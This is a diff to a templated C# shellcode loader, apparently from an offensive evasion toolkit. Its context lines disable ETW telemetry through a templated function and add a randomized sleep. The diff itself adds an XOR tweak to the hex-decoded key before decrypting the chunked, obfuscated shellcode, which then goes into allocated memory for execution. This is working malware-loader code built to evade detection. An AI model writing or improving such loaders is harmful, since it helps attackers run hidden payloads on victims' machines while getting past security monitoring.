@@ -100,8 +100,9 @@
                 {{ v.fn_etw }}();
                 Thread.Sleep(2000 + new Random().Next(3000));
 
-                byte[] sc  = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}),
-                                              {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}));
+                byte[] _k = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
+                for (int _ki = 0; _ki < _k.Length; _ki++) _k[_ki] ^= (byte){{ key_tweak }};
+                byte[] sc = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
 
                 IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
                 Marshal.Copy(sc, 0, mem, sc.Length);
